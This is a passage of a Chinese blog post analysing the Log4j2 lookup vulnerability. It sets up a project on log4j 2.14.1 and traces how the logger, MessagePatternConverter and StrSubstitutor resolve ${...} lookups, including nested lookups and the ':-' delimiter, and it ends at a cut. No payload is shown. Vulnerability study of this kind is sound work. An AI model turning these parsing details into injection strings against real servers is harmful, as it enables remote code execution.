{"title":"Log4j2漏洞分析","uid":"89d22fa1bbfbe26466e8bc1e2008590b","slug":"Log4j漏洞分析","date":"2024-03-12T09:00:00.000Z","updated":"2024-06-28T15:09:21.597Z","comments":true,"path":"api/articles/Log4j漏洞分析.json","keywords":null,"cover":"https://bu.dusays.com/2024/06/28/667ecf00d23c4.webp","content":"<p>复习完 JNDI 之后想专门过来学一下 log4j</p>\n<h1 id=\"demo-实现与具体组件分析\"><a href=\"#demo-实现与具体组件分析\" class=\"headerlink\" title=\"demo 实现与具体组件分析\"></a>demo 实现与具体组件分析</h1><h2 id=\"0x01-环境搭建\"><a href=\"#0x01-环境搭建\" class=\"headerlink\" title=\"0x01 环境搭建\"></a>0x01 环境搭建</h2><p>在分析漏洞之前 ，log4j 的具体工作流程和组成很有必要去了解和熟悉<br>先把测试环境搭建好<br>依赖</p>\n<div class=\"language-xml\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">xml</span><pre class=\"shiki min-dark\" style=\"background-color: #1f1f1f\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #B392F0\">&lt;</span><span style=\"color: #FFAB70\">dependency</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">  &lt;</span><span style=\"color: #FFAB70\">groupId</span><span style=\"color: #B392F0\">&gt;org.apache.logging.log4j&lt;/</span><span style=\"color: #FFAB70\">groupId</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">  &lt;</span><span style=\"color: #FFAB70\">artifactId</span><span style=\"color: #B392F0\">&gt;log4j-core&lt;/</span><span style=\"color: #FFAB70\">artifactId</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">  &lt;</span><span style=\"color: #FFAB70\">version</span><span style=\"color: #B392F0\">&gt;2.14.1&lt;/</span><span style=\"color: #FFAB70\">version</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">&lt;/</span><span style=\"color: #FFAB70\">dependency</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">&lt;</span><span style=\"color: #FFAB70\">dependency</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">  &lt;</span><span style=\"color: #FFAB70\">groupId</span><span style=\"color: #B392F0\">&gt;org.apache.logging.log4j&lt;/</span><span style=\"color: #FFAB70\">groupId</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">  &lt;</span><span style=\"color: #FFAB70\">artifactId</span><span style=\"color: #B392F0\">&gt;log4j-api&lt;/</span><span style=\"color: #FFAB70\">artifactId</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">  &lt;</span><span style=\"color: #FFAB70\">version</span><span style=\"color: #B392F0\">&gt;2.14.1&lt;/</span><span style=\"color: #FFAB70\">version</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">&lt;/</span><span style=\"color: #FFAB70\">dependency</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">&lt;</span><span style=\"color: #FFAB70\">dependency</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">  &lt;</span><span style=\"color: #FFAB70\">groupId</span><span style=\"color: #B392F0\">&gt;junit&lt;/</span><span style=\"color: #FFAB70\">groupId</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">  &lt;</span><span style=\"color: #FFAB70\">artifactId</span><span style=\"color: #B392F0\">&gt;junit&lt;/</span><span style=\"color: #FFAB70\">artifactId</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">  &lt;</span><span style=\"color: #FFAB70\">version</span><span style=\"color: #B392F0\">&gt;4.12&lt;/</span><span style=\"color: #FFAB70\">version</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">  &lt;</span><span style=\"color: #FFAB70\">scope</span><span style=\"color: #B392F0\">&gt;test&lt;/</span><span style=\"color: #FFAB70\">scope</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">&lt;/</span><span style=\"color: #FFAB70\">dependency</span><span style=\"color: #B392F0\">&gt;</span></span></code></pre></div><p>log4j 的配置和其他很多组件很像，都是通过获取一个配置文件中的内容来进行具体配置的。这里我们用 xml 配置文件来写 log4j 的配置<br>通常分为两个部分：1.设置日志信息输出目的地   2.定义 logger，也就是定位我们需要打日志的包中</p>\n<div class=\"language-xml\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">xml</span><pre class=\"shiki min-dark\" style=\"background-color: #1f1f1f\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #B392F0\">&lt;?</span><span style=\"color: #FFAB70\">xml</span><span style=\"color: #B392F0\"> version=</span><span style=\"color: #FFAB70\">&quot;1.0&quot;</span><span style=\"color: #B392F0\"> encoding=</span><span style=\"color: #FFAB70\">&quot;UTF-8&quot;</span><span style=\"color: #B392F0\">?&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">&lt;</span><span style=\"color: #FFAB70\">Configuration</span><span style=\"color: #B392F0\"> status=</span><span style=\"color: #FFAB70\">&quot;TRACE&quot;</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    </span><span style=\"color: #6B737C\">&lt;!-- 配置日志信息输出目的地  Appenders--&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    &lt;</span><span style=\"color: #FFAB70\">Appenders</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #6B737C\">&lt;!-- 输出到控制台 --&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        &lt;</span><span style=\"color: #FFAB70\">Console</span><span style=\"color: #B392F0\"> name=</span><span style=\"color: #FFAB70\">&quot;Console&quot;</span><span style=\"color: #B392F0\"> target=</span><span style=\"color: #FFAB70\">&quot;SYSTEM_OUT&quot;</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #6B737C\">&lt;!--配置日志信息的格式 --&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            &lt;</span><span style=\"color: #FFAB70\">PatternLayout</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    pattern=</span><span style=\"color: #FFAB70\">&quot;%d&#123;HH:mm:ss&#125; [%t] %-5level %logger&#123;36&#125; - %msg%n&quot;</span><span style=\"color: #B392F0\"> /&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            &quot;/&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        &lt;/</span><span style=\"color: #FFAB70\">Console</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #6B737C\">&lt;!-- 输出到文件，其中有一个append属性，默认为true，即不清空该文件原来的信息，采用添加的方式，若设为false，则会先清空原来的信息，再添加 --&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        &lt;</span><span style=\"color: #FFAB70\">File</span><span style=\"color: #B392F0\"> name=</span><span style=\"color: #FFAB70\">&quot;MyFile&quot;</span><span style=\"color: #B392F0\"> fileName=</span><span style=\"color: #FFAB70\">&quot;./logs/info.log&quot;</span><span style=\"color: #B392F0\"> append=</span><span style=\"color: #FFAB70\">&quot;true&quot;</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            &lt;</span><span style=\"color: #FFAB70\">PatternLayout</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                </span><span style=\"color: #6B737C\">&lt;!--配置日志信息的格式 --&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                &lt;</span><span style=\"color: #FFAB70\">pattern</span><span style=\"color: #B392F0\">&gt;%d&#123;HH:mm:ss&#125; [%t] %-5level %logger&#123;36&#125; - %msg%n&lt;/</span><span style=\"color: #FFAB70\">pattern</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            &lt;/</span><span style=\"color: #FFAB70\">PatternLayout</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        &lt;/</span><span style=\"color: #FFAB70\">File</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    &lt;/</span><span style=\"color: #FFAB70\">Appenders</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    </span><span style=\"color: #6B737C\">&lt;!-- 定义logger,只有定义了logger并引入了appender,appender才会有效 --&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    &lt;</span><span style=\"color: #FFAB70\">Loggers</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #6B737C\">&lt;!-- 将业务dao接口所在的包填写进去,并用在控制台和文件中输出 --&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        &lt;</span><span style=\"color: #FFAB70\">logger</span><span style=\"color: #B392F0\"> name=</span><span style=\"color: #FFAB70\">&quot;log4jtest&quot;</span><span style=\"color: #B392F0\"> level=</span><span style=\"color: #FFAB70\">&quot;TRACE&quot;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                additivity=</span><span style=\"color: #FFAB70\">&quot;false&quot;</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            &lt;</span><span style=\"color: #FFAB70\">AppenderRef</span><span style=\"color: #B392F0\"> ref=</span><span style=\"color: #FFAB70\">&quot;Console&quot;</span><span style=\"color: #B392F0\"> /&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            &lt;</span><span style=\"color: #FFAB70\">AppenderRef</span><span style=\"color: #B392F0\"> ref=</span><span style=\"color: #FFAB70\">&quot;MyFile&quot;</span><span style=\"color: #B392F0\"> /&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        &lt;/</span><span style=\"color: #FFAB70\">logger</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        &lt;</span><span style=\"color: #FFAB70\">Root</span><span style=\"color: #B392F0\"> level=</span><span style=\"color: #FFAB70\">&quot;info&quot;</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            &lt;</span><span style=\"color: #FFAB70\">AppenderRef</span><span style=\"color: #B392F0\"> ref=</span><span style=\"color: #FFAB70\">&quot;Console&quot;</span><span style=\"color: #B392F0\"> /&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            &lt;</span><span style=\"color: #FFAB70\">AppenderRef</span><span style=\"color: #B392F0\"> ref=</span><span style=\"color: #FFAB70\">&quot;MyFile&quot;</span><span style=\"color: #B392F0\"> /&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        &lt;/</span><span style=\"color: #FFAB70\">Root</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    &lt;/</span><span style=\"color: #FFAB70\">Loggers</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">&lt;/</span><span style=\"color: #FFAB70\">Configuration</span><span style=\"color: #B392F0\">&gt;</span></span></code></pre></div><p>然后写个测试类</p>\n<div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki min-dark\" style=\"background-color: #1f1f1f\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">logging</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">log4j</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">LogManager</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">logging</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">log4j</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Logger</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">util</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">function</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">LongFunction</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #F97583\">public</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">class</span><span style=\"color: #B392F0\"> log4jtest &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    </span><span style=\"color: #F97583\">public</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">static</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">void</span><span style=\"color: #B392F0\"> main(</span><span style=\"color: #F97583\">String</span><span style=\"color: #B392F0\">[] args) &#123;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">Logger</span><span style=\"color: #B392F0\"> logger </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">LogManager</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getLogger();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #79B8FF\">logger</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">trace(</span><span style=\"color: #FFAB70\">&quot;trace level&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #79B8FF\">logger</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">debug(</span><span style=\"color: #FFAB70\">&quot;debug level&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #79B8FF\">logger</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">info(</span><span style=\"color: #FFAB70\">&quot;info level&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #79B8FF\">logger</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">warn(</span><span style=\"color: #FFAB70\">&quot;warn level&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #79B8FF\">logger</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">error(</span><span style=\"color: #FFAB70\">&quot;error level&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #79B8FF\">logger</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">fatal(</span><span style=\"color: #FFAB70\">&quot;fatal level&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">&#125;</span></span>\n<span class=\"line\"></span></code></pre></div><p>运行一下就能打印出很多信息<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1710212142533-f8fc0add-2d60-4a78-8411-ba2062c66239.png#averageHue=%233b3e40&clientId=u9adf2b5e-1641-4&from=paste&height=359&id=u32e593b3&originHeight=538&originWidth=2347&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=583377&status=done&style=none&taskId=u2d870b2a-9c3a-489d-a7eb-a0e07ee0b0a&title=&width=1564.6666666666667\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>然后在当前项目下应该会有一个 logs 文件夹，用来存放日志信息<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1710212155263-a49afc99-55cf-4d47-b20a-6c5c21e4cd52.png#averageHue=%2342474a&clientId=u9adf2b5e-1641-4&from=paste&height=392&id=u22acc5eb&originHeight=588&originWidth=2428&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=508000&status=done&style=none&taskId=u9f900db5-08e1-43f8-a81c-0bbdebb7d69&title=&width=1618.6666666666667\" referrerpolicy=\"no-referrer\" alt=\"image.png\"></p>\n<h2 id=\"0x02-log4j2-功能组件分析\"><a href=\"#0x02-log4j2-功能组件分析\" class=\"headerlink\" title=\"0x02 log4j2 功能组件分析\"></a>0x02 log4j2 功能组件分析</h2><h3 id=\"1x01-日志记录-触发点—-AbstractLogger\"><a href=\"#1x01-日志记录-触发点—-AbstractLogger\" class=\"headerlink\" title=\"1x01 日志记录&#x2F;触发点—-AbstractLogger\"></a>1x01 日志记录&#x2F;触发点—-AbstractLogger</h3><p>通常情况下我们是使用<code>LogManager.getLogger()</code>方法来获取一个 logger 对象，然后通过调用 logger 对象的 debug&#x2F;info&#x2F;error&#x2F;warn&#x2F;fatal&#x2F;trace&#x2F;log 等方法记录日志等信息<br>在这些方法中，都会先使用<code>org.apache.logging.log4j.spi.AbstractLogger#logIfEnabled</code>的若干重载方法，根据当前配置文件中的配置信息中记录的日志等级，来判断是否需要输出 console 以及日志记录文件，log4j 中的日志记录等级默认如下： ALL &lt; DEBUG &lt; INFO &lt; WARN &lt; ERROR &lt; FATAL &lt; OFF  ，然后默认输出的是 WARN&#x2F;ERROR&#x2F;FATAL  等级的日志信息，我们也可以在配置文件中修改配置日志输出等级：<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1710214649537-44ff100c-d7f1-42cf-b9b3-8aaa562c94d5.png#averageHue=%233b3c3e&clientId=u9adf2b5e-1641-4&from=paste&height=212&id=u0dc06ff7&originHeight=318&originWidth=1093&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=137582&status=done&style=none&taskId=ue15449cf-18fa-48c3-b0d7-b2581fba5d8&title=&width=728.6666666666666\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>具体是在设置 logger 的时候，我们指定它的 level 等级即可，比如我们上面环境实现的等级设置为 TRACE 等级<br>当然也可以用代码直接去配置</p>\n<div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki min-dark\" style=\"background-color: #1f1f1f\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #F97583\">LoggerContext</span><span style=\"color: #B392F0\"> ctx          </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> (LoggerContext) </span><span style=\"color: #79B8FF\">LogManager</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getContext(</span><span style=\"color: #79B8FF\">false</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">Configuration</span><span style=\"color: #B392F0\"> config       </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">ctx</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getConfiguration();</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">LoggerConfig</span><span style=\"color: #B392F0\">  loggerConfig </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">config</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getLoggerConfig(</span><span style=\"color: #79B8FF\">LogManager</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">ROOT_LOGGER_NAME</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #79B8FF\">loggerConfig</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setLevel(</span><span style=\"color: #79B8FF\">Level</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">ALL</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #79B8FF\">ctx</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">updateLoggers();</span></span></code></pre></div><p>logger 本身是一个接口，我们待会分析漏洞的入口就是它的一个抽象实现类 AbstractLogger 开始的，只要调用了 info，error，warn 等方法都可以被作为漏洞的触发点。不同点是配置的输出等级不同<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1710214825621-7d647001-4e10-46fa-be33-2e04976f75d7.png#averageHue=%23466245&clientId=u9adf2b5e-1641-4&from=paste&height=246&id=ub875fa7e&originHeight=369&originWidth=1829&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=207347&status=done&style=none&taskId=ue824a26d-f8fb-472a-af32-c372daa683f&title=&width=1219.3333333333333\" referrerpolicy=\"no-referrer\" alt=\"image.png\"></p>\n<h3 id=\"1x02-消息格式化—-MessagePatternConverter\"><a href=\"#1x02-消息格式化—-MessagePatternConverter\" class=\"headerlink\" title=\"1x02 消息格式化—-MessagePatternConverter\"></a>1x02 消息格式化—-MessagePatternConverter</h3><p>log4j2 采用<code>org.apache.logging.log4j.core.pattern.MessagePatternConverter</code>来对日志信息进行处理<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1710219265205-e4b18538-fd84-4744-9713-1d5cf9b9e3aa.png#averageHue=%23464c51&clientId=u9adf2b5e-1641-4&from=paste&height=285&id=u39d3a13a&originHeight=427&originWidth=931&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=159975&status=done&style=none&taskId=u1ae22810-b5c8-4a11-b56f-be0e80cb3c8&title=&width=620.6666666666666\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>先看一下初始化<br>在初始化MessagePatternConverter 过程中会从 Properties 和 options 获取配置来判断是否需要调用 lookups 功能<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1710215464941-76bda8b6-d418-46c9-b7b2-20342c4afaa2.png#averageHue=%233a3d3e&clientId=u9adf2b5e-1641-4&from=paste&height=623&id=u91764cda&originHeight=934&originWidth=2059&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=631288&status=done&style=none&taskId=uc721d226-620d-411a-80c9-e7929cd109d&title=&width=1372.6666666666667\" referrerpolicy=\"no-referrer\" alt=\"image.png\"></p>\n<p>其中<code>FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS</code>的获取是通过工具类的 <code>getBooleanProperty</code>方法来获取的<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1710215868634-822112e7-d777-4a06-a918-a92215f179ba.png#averageHue=%233a3d3e&clientId=u9adf2b5e-1641-4&from=paste&height=57&id=ufbb6a780&originHeight=86&originWidth=2297&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=99029&status=done&style=none&taskId=u92c391df-ac09-4642-9a28-81e4d0e0bfb&title=&width=1531.3333333333333\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1710215921302-a837bce7-2d3b-42a4-9104-d1143e7d3ed6.png#averageHue=%233b4042&clientId=u9adf2b5e-1641-4&from=paste&height=122&id=ub2dcb156&originHeight=183&originWidth=1371&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=106869&status=done&style=none&taskId=udc42cef6-b251-46d0-8146-f61f3b26051&title=&width=914\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>他这里的默认值传进来是 false，然后在默认 options 为空的情况下，<code>loadNoLookups</code>方法运算出来为-1，所以<code>Constants.FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS || noLookupsIdx &gt;= 0</code>运算出来为 false，<code>noLookups</code>的默认值就为 false，也就是 lookups 功能默认是开启的<br>继续看下面的方法<br><code>loadMessageRenderer</code>方法通过 options 中的字符配置来获取相应的模板渲染器<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1710219542994-e687ca62-4040-46cc-99a5-185b4b55e294.png#averageHue=%23373c45&clientId=u9adf2b5e-1641-4&from=paste&height=554&id=u524326c7&originHeight=831&originWidth=1980&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=542412&status=done&style=none&taskId=u158428d1-37e4-45b3-96e6-48b9d61dec1&title=&width=1320\" referrerpolicy=\"no-referrer\" alt=\"image.png\"></p>\n<p>format 方法有两段 if 判断的内容<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1710219606882-37ef7b0e-1773-4cbd-974f-6a6d1eaa7348.png#averageHue=%23373e46&clientId=u9adf2b5e-1641-4&from=paste&height=631&id=ub17ab724&originHeight=946&originWidth=1670&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=629345&status=done&style=none&taskId=u6171be58-84ec-46a7-bfde-efc30e9f475&title=&width=1113.3333333333333\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>第一段 if 判断的内容是先从 event 中获取到 message，然后判断 message 的类型是否为 StringBuilderFormattable，之后就是渲染的具体内容<br>第二段 if 判断的内容是重点，在一个正常请求的情况下：config 获取不为空，并且 noLookups 默认为 false 的情况下，标志着我们可以通过 lookups 功能来进行字符串解析<br>然后这里的解析功能的重点是在\t<code>config.getStrSubstitutor().replace(event, value)</code>中</p>\n<h3 id=\"1x03-字符替换—-StrSubstitutor\"><a href=\"#1x03-字符替换—-StrSubstitutor\" class=\"headerlink\" title=\"1x03 字符替换—-StrSubstitutor\"></a>1x03 字符替换—-StrSubstitutor</h3><p>log4j2 中提供的 lookup 功能的字符替换的关键处理类就是<code>StrSubstitutor</code>，位于<code>org.apache.logging.log4j.core.lookup.StrSubstitutor</code>，现在来看它的具体内容<br>光是默认属性配置就需要重点注意，默认的<code>PREFIX</code>前缀是<code>$&#123;</code> ，默认的后缀<code>&#125;</code>，默认赋值分隔符<code>DEFAULT_VALUE_DELIMITER_STRING</code><br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1710220413898-166581a5-7e26-4735-9e5e-990e4718fd42.png#averageHue=%23373c45&clientId=u9adf2b5e-1641-4&from=paste&height=540&id=u89b90a04&originHeight=810&originWidth=1685&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=503673&status=done&style=none&taskId=u40c85d15-0cda-4dcd-9bcb-3beabe1596e&title=&width=1123.3333333333333\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>StrSubstitutor 中的关键方法是<code>substitute</code>，也是整个 lookup 功能的核心，用来递归替换相应的字符<br>由于该方法的内容较多，这里我们只截取关键性内容<br>方法的开头先把各个前后缀以及内容的匹配器加载上<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1710221217261-22d3a09f-a22f-4dd5-b7e6-237a4c2c464c.png#averageHue=%23383e47&clientId=u9adf2b5e-1641-4&from=paste&height=357&id=ua0a17b0e&originHeight=536&originWidth=1576&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=352497&status=done&style=none&taskId=ufa17f968-f015-4734-9a9b-157dd1c2b99&title=&width=1050.6666666666667\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>然后通过 while 循环来找前缀，这里找的前缀是最开始的前缀<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1710221191342-53788248-faec-4bd5-aaad-1d9e9d5d2919.png#averageHue=%23393e47&clientId=u9adf2b5e-1641-4&from=paste&height=139&id=u1832f882&originHeight=208&originWidth=1222&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=121220&status=done&style=none&taskId=ufbcaeb62-41ad-467f-9a11-4b855656662&title=&width=814.6666666666666\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>找完前缀再找后缀，不过在找后缀的 while 循环中，又判断了是否替换变量中的值，如果替换，则再匹配一次前缀，如果找到了前缀，则 continue 跳出循环，再走一次找后缀的逻辑，比如说这个${${}}这种情况<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1710221512947-246ee3e6-221e-4ef9-9e4f-3388162a6de6.png#averageHue=%23363d46&clientId=u9adf2b5e-1641-4&from=paste&height=364&id=ue095a088&originHeight=546&originWidth=1421&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=329367&status=done&style=none&taskId=u57278df7-1203-4c23-b755-88a1e9273aa&title=&width=947.3333333333334\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>后续的逻辑中，主要是针对<code>DEFAULT_VALUE_DELIMITER_STRING</code>以及<code>ESCAPE_DELIMITER_STRING</code>进行，通过多个 if&#x2F;else 来匹配<code>:-</code>和<code>:\\-</code><br><img 